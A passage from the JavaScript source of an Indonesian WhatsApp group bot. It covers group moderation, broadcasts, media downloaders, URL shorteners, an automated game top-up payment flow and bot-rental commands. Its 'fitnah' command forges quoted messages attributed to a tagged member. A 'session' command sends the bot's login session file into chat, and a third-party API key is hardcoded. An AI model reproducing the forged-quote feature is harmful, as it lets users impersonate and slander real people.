        case prefix+'revoke':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins) return reply(mess.GrupAdmin)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            await lexxy.groupRevokeInvite(from)
            .then( res => {
                reply(`Sukses menyetel tautan undangan grup ini`)
            }).catch(() => reply(mess.error.api))
            

break
case prefix+'tagall': {
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Teks?`)
let teks = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
lexxy.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: msg })
}


break
        case prefix+'hidetag':
            if (!isGroup) return reply(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            let mem = [];
            groupMembers.map( i => mem.push(i.id) )
            lexxy.sendMessage(from, { text: q ? q : '', mentions: mem })
            

break
        case prefix+'delete': case prefix+'del': case prefix+'d':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!isQuotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
            if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
            lexxy.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
            

break
        // Owners Menu
        case prefix+'exif':
            if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
            var namaPack = q.split('|')[0] ? q.split('|')[0] : q
            var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
            exif.create(namaPack, authorPack)
            reply(`Sukses membuat exif`)
            

break
case prefix+'join':
 if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
            if (args.length < 2) return reply(`Kirim perintah ${command} _linkgrup_`)
            if (!isUrl(args[1])) return reply(mess.error.Iv)
            var url = args[1]
            url = url.split('https://chat.whatsapp.com/')[1]
            var data = await lexxy.groupAcceptInvite(url)
            reply(jsonformat(data))
            

break
        case prefix+'leave':
            if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
            if (!isGroup) return reply(mess.OnlyGrup)
            lexxy.groupLeave(from)
            

break
        case prefix+'self':{
            if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
            lexxy.mode = 'self'
            reply('Berhasil berubah ke mode self')
            }
            

break
        case prefix+'publik': case prefix+'public':{
            if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
            lexxy.mode = 'public'
            reply('Berhasil berubah ke mode public')
            }
            

break
case prefix+'rules':
let rulestext =`
≻ *SYARAT & KETENTUAN*

1. Jangan Spam Bot.
Sanksi: *❎ WARN/SOFT BLOCK*
2. Jangan Telepon Bot.
Sanksi: *❎ SOFT BLOCK*
3. Jangan Mengeksploitasi Bot.
Sanksi: *PERMANENT BLOCK*

💬 : Bang Cara Dapetin Script Botnya? Gmn
👤 : Cukup Beli Di Lexxy Official Ketik *${prefix}creator*

💬 : Bang Boleh Ku Masukin Ngga Botnya Di Group?
👤 : Dilarang Masukin Bot Ke Group Kecuali Atas Izin Owner.

Jika sudah dipahami rules-nya, silakan ketik *#menu* untuk memulai!
Segala kebijakan dan ketentuan *${setting.botName}* di pegang oleh owner dan segala perubahan kebijakan, sewaktu waktu owner berhak mencabut, atau memblokir user(*﹏*)`
reply(rulestext)

break
case prefix+'sewabot':
let textSewaNya =`
*LIST HARGA SEWABOT*

*_Sewabot Harian :_*
➭ _1 Hari = Rp700_
➭ _2 Hari = Rp1.500_
➭ _3 Hari = Rp2.100_
➭ _4 Hari = Rp2.700_
➭ _5 Hari = Rp3.500_
➭ _6 Hari = Rp4.200_

*_Sewabot Mingguan :_*
➭ _1 Minggu = Rp5.000_
➭ _2 Minggu = Rp9.700_
➭ _3 Minggu = Rp.13.500_

*_Sewabot Bulanan :_*
➭ _1 Bulan = Rp14.500_
➭ _2 Bulan = Rp28.000_
➭ _3 Bulan = Rp42.000_

*_Paket Premium :_*
_➭ Permanen = Rp70.000_

*Keuntungan Sewabot :*
1. _Bot Online 24 Jam_
2. _Ada Fitur Topup ff Otomatis_
3. _Fitur Store / Buat Jualan Di Group_
4. _Antilink/Hidetag/Shortlink/Kick_
5. _Addlist/Dellist/SetProses/SetDone_
6. _Buka Group - Tutup Group_

*Jika Minat Hubungi Admin.*
_Wa.me/6281323445612_
`
reply(textSewaNya)
break
case prefix+'donasi':
case prefix+'donate':
let textDonaNya =`${textdonasi(sender, prefix)}`
reply(textDonaNya)
break
case prefix+'mysesi':
case prefix+'sendsesi':
case prefix+'session':
if (!isOwner) return reply(mess.OnlyOwner)
var setting = JSON.parse(fs.readFileSync('./config.json'));
var anumu = await fs.readFileSync(`./${setting.sessionName}.json`)
lexxy.sendMessage(from, { document: anumu, mimetype: 'document/application', fileName: 'session.json'}, {quoted: msg } )
reply(`*Note :*\n_Session Bot Bersifat Untuk Pribadi Dari Owner Maupun Bot, Tidak Untuk User Bot Ataupun Pengguna Bot._`)
reply(`_Sedang Mengirim Document_\n_Nama Session : ${setting.sessionName}.json_\n_Mohon Tunggu Sebentar..._`)

			break
case 'bot':
reply(`Wa.me/${botNumber.split("@")[0]}`)
break
case 'wame':
reply(`Wa.me/${sender.split("@")[0]}`)
break
        case prefix+'setpp': case prefix+'setppbot':
            if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
            if (isImage || isQuotedImage) {
                var media = await downloadAndSaveMediaMessage('image', 'ppbot.jpeg')
                if (args[1] == '\'panjang\'') {
                    var { img } = await generateProfilePicture(media)
                    await lexxy.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type:'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [
                        {
                            tag: 'picture',
                            attrs: { type: 'image' },
                            content: img
                        }
					    ]
                    })
					fs.unlinkSync(media)
					reply(`Sukses`)
				} else {
					var data = await lexxy.updateProfilePicture(botNumber, { url: media })
			        fs.unlinkSync(media)
				    reply(`Sukses`)
				}
            } else {
                reply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
            }
            

break
case prefix+'sc':
case prefix+'script':{
reply(`_Script ini Dijual 35k Minat Chat_\n*Wa.me/6283834558105 ( Lexxy )*\n*No Enc 100% Work All Fitur*`)
}
break
  case prefix+'stat': case prefix+'stats':
                case prefix+'statistik':
                   
                   var nodeos = require('node-os-utils')
                   var { totalGb, usedGb, freeGb } = await nodeos.drive.info()
                   var { download, upload } = await checkBandwidth()
                   
                   var allgrup = await lexxy.groupFetchAllParticipating().then(res => Object.values(res))
                   var allchat = await store.chats.all()
                   var tmp = speed(); var tmps = speed() - tmp
                   var sesize = bytesToSize(fs.statSync(`./${setting.sessionName}.json`).size)
                   var stat = `*STATISTIK BOT*

*Speed :* ${tmps.toFixed(4)} s
*Runtime :* ${runtime(process.uptime())}
*Total Chat :* ${allchat.length}
*Private Chat :* ${allchat.length - allgrup.length}
*Group Chat :* ${allgrup.length}
*Total Hit :* ${ini_hitnya.value}

*Download :* ${download}
*Upload :* ${upload}
*Total Storage :* ${totalGb} GB
*Used :* ${usedGb} GB
*Free :* ${freeGb} GB
*Session Size :* ${sesize}`

                   reply(stat)
                   break

        case prefix+'broadcast': case prefix+'bc':
            if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
            if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
            var data = await store.chats.all()
            var teks = `${q}`
            for (let i of data) {
                lexxy.sendMessage(i.id, { text: teks })
                await sleep(1000)
            }
            reply(`Sukses mengirim pesan siaran kepada ${data.length} chat`)
            

break
case prefix+'creategc':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`*Example :*\n${command} namagroup`)
var namanya = body.slice(10)
let cret = await lexxy.groupCreate(namanya, [])
let response = await lexxy.groupInviteCode(cret.id)
var teks = `  「 *Create Group* 」

_*▸ Name : ${cret.subject}*_
_*▸ Owner : @${cret.owner.split("@")[0]}*_
_*▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB*_

*Link Create Group* :
https://chat.whatsapp.com/${response}
`
reply(teks)


break
case prefix+'addkey':
case prefix+'addrespon':
if (isGroup) return reply('Khusus Chat Pribadi Kak')
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`*FORMAT ADDRESPON*\n\n_Example:_\n${command} *key@response*\n\n_Contoh:_\n${command} *tes@apa*`)
if (checkResponGroup(from, args1, db_respon_group)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponGroup(from, args1, args2, db_respon_group)
reply(`Berhasil menambah Respon : *${args1}*`)


break
case prefix+'delkey':
case prefix+'delrespon':
if (isGroup) return reply('Khusus Chat Pribadi Kak')
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q
if (db_respon_group.length === 0) return reply(`Belum ada key message di database`)
if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
if (!checkResponGroup(from, args1, db_respon_group)) return reply(`List respon dengan key *${args1}* tidak ada di database!`)
deleteResponGroup(from, args1, db_respon_group)
reply(`Sukses hapus respon message dengan key *${q}*`)


break
case prefix+'setkey':
case prefix+'setrespon':
if (isGroup) return reply('Khusus Chat Pribadi Kak')
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`*FORMAT ADDRESPON*\n\n_Example:_\n${command} *key@response*\n\n_Contoh:_\n${command} *tes@apa*`)
if (checkResponGroup(from, q, db_respon_group)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
changeResponGroup(from, args1, args2, db_respon_group)
reply(`Berhasil mengubah Respon : *${args1}*`)


break
case prefix+'setclose':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Example :\n${command} text\n\nContoh :\n${command} Group Di Tutup Sementara.`)
var args1 = q
addSetClose(args1, from, db_close_group) 
reply(`Berhasil mengubah pesan group close menjadi : ${args1}`)


break
case prefix+'delclose':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
removeSetClose(from, db_close_group)
reply(`Sukses hapus pesan group close`)


break
case prefix+'getclose':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isSetClose(from, db_close_group)) return reply(`Belum ada pesan close\nsilahkan ketik ${prefix}setclose`)
reply(`*PESAN CLOSE GROUP*\n${getTextSetClose(from, db_close_group)}`)


break
case prefix+'listkey':
case prefix+'cekrespon':
case prefix+'listrespon':{
if (isGroup) return reply('Khusus Chat Pribadi Kak')
var group_respon_nya = JSON.parse(fs.readFileSync('./database/respon-group.json'))
if (db_respon_group.length === 0) return reply(`Belum ada respon message di database\nSilahkan Ketik ${prefix}addkey`)
let teks = `*LIST RESPON MESSAGE*\n`
for (let i of group_respon_nya) {
teks += `*keyword :* ${i.key}\n`
}
reply(teks)
}


break
case prefix+'setopen':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Example :\n${command} text\n\nContoh :\n${command} Group Sudah Open Kembali.`)
var args1 = q
addSetOpen(args1, from, db_open_group) 
reply(`Berhasil mengubah pesan group open menjadi : ${args1}`)


break
case prefix+'delopen':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
removeSetOpen(from, db_open_group)
reply(`Sukses hapus pesan group open`)


break
case prefix+'getopen':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isSetOpen(from, db_open_group)) return reply(`Belum ada pesan open grup\nsilahkan ketik ${prefix}setopen`)
reply(`*PESAN OPEN GROUP*\n${getTextSetOpen(from, db_open_group)}`)


break
case prefix+'simi':
if (!q) return reply(`*Contoh* : ${prefix+command} halo`)
fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
.then(simi1 => {reply(simi1.success)})

break
case prefix+"facebook":{

if (!q) return reply(`*Contoh :*\n${command} https://www.facebook.com/mhmd.farid.908/videos/473529950837803/`)

hikki.downloader.facebookDownload(q).then(data => {
reply(mess.wait)
let fbText =`*FACEBOOK DOWNLOAD*
Title : ${data.result.title}
From : ${data.result.url}`
lexxy.sendMessage(from, { video: { url: data.result.hd }, caption: fbText }, { quoted: msg })
});
}


break

case prefix+'tiktok':{
if (!q) return reply(`contoh :\n${command} https://vt.tiktok.com/ZSdbFNn96/?k=1`)
var url = q
var fatihh = await fetchJson(`https://hadi-api.herokuapp.com/api/tiktok?url=${url}`)
if (fatihh.msg) return reply('Link URL tidak valid')
reply(mess.wait)
var fatih = fatihh.result
lexxy.sendMessage(from, { video: { url: fatih.video.nowm }, caption: 'done!! no watermak' }, { quoted: msg })
lexxy.sendMessage(from, { audio: { url: fatih.audio_only.original }, mimetype: 'audio/mpeg', fileName: `${fatih.title}.mp3` }, { quoted: msg })
}
break

case prefix+"Instagram":{
if (!q) return reply(`Contoh :\n${command} url`)
hikki.downloader.metaScrape(q).then(data => {
console.log(data)
let Deteckk =`*META-SCRAPE*
Source : ${data.source}
Video : ${data.medias[0].videoAvailable}
Audio : ${data.medias[0].audioAvailable}`
reply(Deteckk)

let SourceText =`*SOSIAL-MEDIA*
url : ${data.url}
quality : ${data.medias[0].quality}
extension : ${data.medias[0].extension}
formattedSize : ${data.medias[0].formattedSize}
videoAvailable : ${data.medias[0].videoAvailable}
audioAvailable : ${data.medias[0].audioAvailable}
chunked : ${data.medias[0].chunked}

Source : ${data.source}`
reply(mess.wait)

lexxy.sendMessage(from, { video: { url: data.medias[0].url }, caption: SourceText }, { quoted: msg})
lexxy.sendMessage(from, { audio: { url: data.medias[0].url }, mimetype: 'audio/mpeg', fileName: `${data.title}.mp3` }, { quoted: msg })
});
}
break
case prefix+'gsmarena':{
if (!q) return reply(`*Contoh * : ${prefix+command} realme`)
reply(mess.wait)
let gsMaren = await fetchJson(`https://api-yogipw.herokuapp.com/api/search/gsmarena?query=${q}`)
let textGsMarena =`*GS-MARENA SEARCHING*
judul : ${gsMaren.judul}
rilis : ${gsMaren.rilis}
type : ${gsMaren.type}
ukuran : ${gsMaren.ukuran}
storage : ${gsMaren.storage}
display : ${gsMaren.display}
inchi : ${gsMaren.inchi}
pixel : ${gsMaren.pixel}
videoPixel : ${gsMaren.videoPixel}
ram : ${gsMaren.ram}
chipset : ${gsMaren.chipset}
baterai : ${gsMaren.batrai}
merek_baterai : ${gsMaren.merek_batre}

*detail*:
${gsMaren.detail}`
let tbMarena = await getBuffer(gsMaren.thumb)
lexxy.sendMessage(from, { image: tbMarena, caption: textGsMarena}, { quoted: msg })
}


break
case prefix+"tinyurl":{


if (!q) return reply(`*Contoh :*\n${prefix+command} google.com`)
let tinyurl = await fetchJson(`https://api-yogipw.herokuapp.com/api/short/tinyurl?url=${q}`)
lexxy.sendMessage(from, {text: `Link Original : ${q}\nLink Shortlink : ${tinyurl.result}`, quoted: msg })
}


break
case prefix+"isgd":{


if (!q) return reply(`*Contoh :*\n${command} http://google.com`)
let isgd = await fetchJson(`https://api-yogipw.herokuapp.com/api/short/isgd?url=${q}`)
lexxy.sendMessage(from, {text: `Link Original : ${q}\nLink Shortlink : ${isgd.result.link}`, quoted: msg })
}


break
case prefix+"cuttly":{


if (!q) return reply(`*Contoh :*\n${command} http://google.com`)
let cuttly = await fetchJson(`https://api-yogipw.herokuapp.com/api/short/cuttly?url=${q}`)
lexxy.sendMessage(from, {text: `Link Original : ${q}\nLink Shortlink : ${cuttly.result.link}`, quoted: msg })
}


break
case prefix+'salurantv':
reply(`*DAFTAR_STASIUN*\nrcti\nnettv\nantv\ngtv\nindosiar\ninewstv\nkompastv\nmetrotv\nmnctv\nrtv\nsctv\ntrans7\ntranstv\ntvone\ntvri`)
break
case prefix+'jadwaltv':{
if (!q) return reply(`Contoh :\n${command} rcti`)
var anu = await fetchJson(`http://nzcha-apii.herokuapp.com/jadwaltv?channel=${q}`)
if (anu.handle) return reply(`Saluran tidak ditemukan silahkan lihat list saluran ketik ${prefix}salurantv`)
teks = ` 「 *JADWAL-TV* 」\n\nNama Channel : ${q}\nJumlah Siaran : ${anu.jumlah_channel_tv}\n\n`
for (let i of anu.result) {
 teks +=`jam : ${i.jam}\ntayang : ${i.tayang}\n\n`
}
reply(teks)
}
break
case prefix+'shorturl':{
if (!q) return reply(`*Contoh :*\n${command} http://google.com`)
var shot = await fetchJson(`https://hadi-api.herokuapp.com/api/shorturl?url=${q}`)
if (shot.msg) return reply('[!] url harus di awali dengan http:// atau https://')
reply(shot.result)
}
break
case prefix+'id':
reply(from)

break
case prefix+'y':{
const template = generateWAMessageFromContent(from, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                           hydratedContentText: 'p',
                            locationMessage: {
                            jpegThumbnail: setting.pathimg},
                            hydratedFooterText: footer,
                            hydratedButtons: [{          
            "urlButton": {
              "displayText": "My Group",
              "url": "https://chat.whatsapp.com/I5tQ4U2B7CVFh3P5QmvgLv"
            }
          },
        ]
      }
    }
               }), { userJid: from })
            lexxy.relayMessage(from, template.message, { messageId: template.key.id })
                }
break
case prefix+'topupff':{


if (!q) return reply(`*Example :*\n${command} id\n\n*Contoh :*\n${command} 239814337`)
let sections = []

var idnya = body.slice(9)

let listmenu = [`cek_data_ff ${idnya}|5`,`cek_data_ff ${idnya}|12`,`cek_data_ff ${idnya}|70`,`cek_data_ff ${idnya}|140`,`cek_data_ff ${idnya}|355`,`cek_data_ff ${idnya}|720`]
let listmenuu = [`5 DIAMOND 💎`,`12 DIAMOND 💎`,`70 DIAMOND 💎`,`140 DIAMOND 💎`,`355 DIAMOND 💎`,`720 DIAMOND 💎`]
let lahkokngamok = ['Sistem Proses Otomatis 3-7 Menit']
let nombor = 1

let startnum = 0
let startnumm = 0
for (let x of listmenu) {
const yy = {title: 'List Diamond Ke ' + nombor++,
rows: [
{
title: `${listmenuu[startnum++]}`,
description: `${lahkokngamok[startnumm]}`,
rowId: `${prefix}${x}`
}
]
}
sections.push(yy)
}
const sendm =  lexxy.sendMessage(
from, 
{
text: `Silahkan Pilih List Nominal Topup Diamond Yang Tersedia!.

Note: Pembayaran Disini Hanya Menggunakan Server, Owner Tidak Mendapatkan Hasil Apapun Disini Karena Diproses Langsung Dari Server!.

Jika Sudah Melakukan Pemilihan Nominal, Anda Akan Dikirimkan Data Transaksi, Silahkan Cek Terlebih Dahulu Sebelum Konfirmasi.`,
footer: `® Top Up Free Fire Otomatis`,
title: `━━[ Nominal Diamond ]━━`, 
buttonText: "Click Here", 
sections,
mentions:[sender]
}, { quoted : msg })
}

			

break
case prefix+'btltranksaksi':{
var BAtAl =`Baik kak Tranksaksi ID ${q.split("|")[0]} telah di batalkan, jika ingin melakukan topup lagi silahkan ketik ${prefix}topupff`
reply(BAtAl)
}
break
case prefix+'cek_data_ff':
if (!q) return reply(`*Example :*\n${command} id|nominal\n\n*Contoh :*\n${command} 239814337|70\n\n_Support Nominal_ :\n5 12 70 140 355 720`)

var res = q
var idnya = res.split("|")[0]
var dmnya = res.split("|")[1]

reply(mess.wait)

async function topupFreeFire() {

const makeSession = await hikki.game.topupFreeFire(idnya, dmnya) 

//console.log(makeSession)

let nihbos = makeSession.data.paymentName
let nihname = makeSession.data.userNameGame
let produkharga = makeSession.data.price
let idtranks = makeSession.data.transactionId
let jumlahdm = makeSession.data.item.name

var yainj =`
*TOP UP DIAMOND FREE FIRE*
🎮 *Game ID : ${idnya}*
📝 *Nickname : ${nihname}*
🛒 *Produk : Diamond FF*
🏷️ *Jumlah : ${jumlahdm}* 💎
💸 *Payment : ${nihbos}*
🪙 *Harga Produk : Rp${produkharga}*
📊 *ID Tranksaksi : ${idtranks}*
`
var yoicpii =`Sebelum Melakukan Pembayaran Silahkan Cek Data Di Atas Apakah Sudah Benar?

Jika Data Nya Sudah Benar, Silahkan Klik Button Konfirmasi Di Bawah dan jika ada data yg salah silahkan klik button Batalkan`

var bgnya = await getBuffer(`https://telegra.ph/file/09a8a59066e980373c030.jpg`)

const buttons = [
  {buttonId: `${prefix}bayar_topup_ff ${q.split("|")[0]}|${q.split("|")[1]}`, buttonText: {displayText: 'Konfirmasi'}, type: 1},
  {buttonId: `${prefix}btltranksaksi ${idtranks}`, buttonText: {displayText: 'Batalkan'}, type: 1}
  ]

const buttonMessagehh = {

    text: `${yainj}`,
    footer: `${yoicpii}`,
    buttons: buttons,
    headerType: 1
    }
    
const sendMsg = await lexxy.sendMessage(from, buttonMessagehh, { quoted: fkontak})

return await hikki.game.payDiamond(makeSession, '085789004732')
}
topupFreeFire().then(data => {
})



break

case prefix+'bayar_topup_ff':

var res = q
var id = res.split("|")[0]
var nom = res.split("|")[1]

async function topupFreeFire2() {
const makeSession = await hikki.game.topupFreeFire(id, nom) // support nominal 5 12 70 140 355 720'
// console.log(makeSession) if get more property

let p1 = makeSession.data.paymentId
let p2 = makeSession.data.item.id
let p3 = makeSession.data.gameId
let nihbos = makeSession.data.paymentName
let nihname = makeSession.data.userNameGame
let produkharga = makeSession.data.price
let idtranks = makeSession.data.transactionId
let jumlahdm = makeSession.data.item.name


var konfir =`*KONFIRMASI TRANSAKSI*\n_#${p1}${p2}${p3}_\n\n*DATA RESULT*\n• _*ID Game :* ${id}_\n• _*Nickname :* ${nihname}_\n• _*Payment* : ${nihbos}_\n• _*Harga Produk :* Rp.${produkharga}_\n• _*Produk :* Diamond Free Fire_`
reply(konfir)

return await hikki.game.payDiamond(makeSession, '085789004732')
}
topupFreeFire2().then(data => {
lexxy.sendMessage(from, { image: { url: data.qrCode }, caption: `_Silahkan Transfer Via Qris Di Atas_\n\n*Note :*\n_Wajib Transfer Sesuai Jumlah, Agar Diamond Otomatis Masuk_\n\n*Count :*\n_Qris Berlaku Hanya 5 Menit_` }, { quoted: msg })
})


break
case prefix+'react':
if (!isQuotedMsg) return reply(`Balas pesannya dengan emoji contoh ${command} 🗿`)
                   if (args.length < 2) return reply(`Balas pesannya dengan emoji contoh ${command} 🗿`)
                   if (!isEmoji(args[1])) return reply(`Itu bukan emoji!`)
                   if (isEmoji(args[1]).length > 1) return reply(`Satu aja emojinya`)
                   var reactMsg = { reactionMessage: {
                        key: {
                          remoteJid: from,
                          fromMe: quotedMsg.fromMe,
                          id: quotedMsg.id,
                          participant: quotedMsg.sender
                        },
                        text: args[1]
                      }
                   }
                   lexxy.sendMessageFromContent(from, reactMsg)
                   break
case prefix+'say':

              //     if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
                //   addCountCmd('#say', sender, _cmd)
                   var lang = q.split("--")[1]
                   if (!lang) lang = 'id'
                   var gen = ["female", "male"].includes(args[1]) ? args[1] : 'male'
                   var teks = ["female", "male"].includes(args[1]) ? (q.slice(args[1].length + 1, q.length).split('--')[0]) : q.split('--')[0]
                   lexxy.sendPresenceUpdate('recording', from)
                   getBuffer(`http://texttospeech.responsivevoice.org/v1/text:synthesize?text=${removeEmojis(teks)}&lang=${lang}&engine=g3&name=&pitch=0.5&rate=0.420&volume=1&key=0POmS5Y2&gender=${gen}`)
                   .then(async(buf) => {
                    lexxy.sendMessage(from, { audio: buf, mimetype: 'audio/mp4', ptt: true }, { quoted: msg })
               //  limitAdd(sender, limit)
                   })
                   break
case prefix+'towame':

                   if (isQuotedMsg) {
                     if (quotedMsg.chats.length > 1) {
                       var all = quotedMsg.chats.split('\n')
                       var teks = ''
                       for (let i of all) {
                         var a = i.replace(/[+| |(|)|.|-]/gi, "")
                         var b = parseInt(a)
                         if (!b) teks += `${i} fail`
                         teks += `wa.me/`+b+'\n'
                       }
                       reply(teks.trim())
                //       limitAdd(sender, limit)
                     } else {
                  //     addCountCmd('#towame', sender, _cmd)
                       var a = quotedMsg.chats.replace(/[+| |(|)|.|-]/gi, "")
                       var b = parseInt(a)
                       if (!b) return reply("Pastikan hanya reply angka")
                       reply("wa.me/"+b)
                   //   limitAdd(sender, limit)
                     }
                   } else if (args.length > 1) {
                  //   addCountCmd('#towame', sender, _cmd)
                     if (q.split('\n').length > 1) {
                       var all = q.split('\n')
                       var teks = ''
                       for (let i of all) {
                         var a = i.replace(/[+| |(|)|.|-]/gi, "")
                         var b = parseInt(a)
                         if (!b) teks += `${i} fail`
                         teks += `wa.me/`+b+'\n'
                       }
                       reply(teks.trim())
                     //  limitAdd(sender, limit)
                     } else {
                       var a = q.replace(/[+| |(|)|.|-]/gi, "")
                       var b = parseInt(a)
                       if (!b) return reply("Pastikan hanya angka")
                       reply("wa.me/"+b)
                      // limitAdd(sender, limit)
                     }
                   } else {
                     reply(`Kirim perintah ${command} nomer atau balas pesan nomernya dengan caption ${command}`)
                   }
                   break
case prefix+'addsewa':
            if (!isOwner && !fromMe) return replyDeface(mess.OnlyOwner)
            if (args.length < 2) return reply(`Gunakan dengan cara ${command} *linkgc waktu*\n\nContoh : ${command} https://chat.whatsapp.com/Hjv5qt195A2AcwkbswwoMQ 30d\n\n*LIST WAKTU*\nd = days\nh = hours\nm = minutes\n\n*TRANSLATE*\ndays > hari\nhours > jam\nminutes > menit`)
            if (!isUrl(args[1])) return reply(mess.error.Iv)
            var url = args[1]
         //   addCountCmd('#addsewa', sender, _cmd)
            url = url.split('https://chat.whatsapp.com/')[1]
            if (!args[2]) return reply(`Waktunya?`)
            var data = await lexxy.groupAcceptInvite(url)
            if (_sewa.checkSewaGroup(data, sewa)) return reply(`Bot sudah disewa oleh grup tersebut!`)
            _sewa.addSewaGroup(data, args[2], sewa)
            reply(`Success Add Sewa Group Berwaktu!`)
            break
        case prefix+'delsewa':
            if (!isOwner && !fromMe) return replyDeface(mess.OnlyOwner)
            if (!isGroup) return reply(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
            if (!isSewa) return reply(`Bot tidak disewa di Grup ini`)
       //     addCountCmd('#delsewa', sender, _cmd)
            sewa.splice(_sewa.getSewaPosition(args[1] ? args[1] : from, sewa), 1)
            fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
            reply(`Sukses`)
            break
       case prefix+'listsewa':
            let list_sewa_list = `*LIST-SEWA-GROUP*\n\n*Total:* ${sewa.length}\n\n`
            let data_array = [];
            for (let x of sewa) {
            //    addCountCmd('#listsewa', sender, _cmd)
                list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
                if (x.expired === 'PERMANENT') {
                    let ceksewa = 'PERMANENT'
                    list_sewa_list += `*Expire :* PERMANENT\n\n`
                } else {
                    let ceksewa = ms(x.expired - Date.now())
                    list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
                }
            }
            lexxy.sendMessage(from, { text: list_sewa_list }, { quoted: msg })
            break
            case prefix+'checksewa': case prefix+'ceksewa':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isSewa) return reply(`Bot tidak di sewa group ini!`)
          //  addCountCmd('#checksewa', sender, _cmd)
            let ceksewa = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
            let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)`
            reply(sewanya)
            break
case prefix+'inspect':{
if (args.length < 2) return reply(`Kirim perintah ${command} linkgrup`)
var regx = /chat.whatsapp.com\/([\w\d]*)/g;
var ini_cek = args[1].match(regx)
var ini_cek = ini_cek[0].replace('chat.whatsapp.com/', '')
lexxy.groupInspectCode(ini_cek).then( data => {
if (data.msg) return reply(`Maaf terjadi kesalahan, silahkan coba link lain!`)
var { id, subject, creator, creation, size, desc, participants } = data
var teks = `*GROUP INSPECT LINK*\n
*Id Group :* ${id}
*Subjek :* ${subject}
*Owner :* ${creator !== undefined ? '@'+creator.split("@")[0] : id.includes('-') ? '@'+id.split('-')[0] : 'Not detected'}
*Di Buat Pada :* ${formatDate(creation * 1000)}
*Total Member :* ${size}\n
*Teman yang diketahui join :* ${participants ? '\n' + participants.map((user, i) => ++i + '. @' + user.id.split(`@`)[0]).join('\n').trim() : 'Tidak ada'}\n
*Deskripsi :* ${desc !== undefined ? desc : ""}`
reply(teks)
});
}
break
case prefix+'fitnah':
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (args.length < 2) return reply(`Kirim perintah *${command}* @tag|pesantarget|pesanbot`)
                   var org = q.split("|")[0]
                   var target = q.split("|")[1];
                   var bot = q.split("|")[2];
                   if (!org.startsWith('@')) return reply('Tag orangnya')
                   if (!target) return reply(`Masukkan pesan target!`)
                   if (!bot) return reply(`Masukkan pesan bot!`)
                   var mens = parseMention(target)
                 //  addCountCmd('#fitnah', sender, _cmd)
                   var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
                   var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
                  lexxy.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
                   break
case prefix+'fakehidetag':
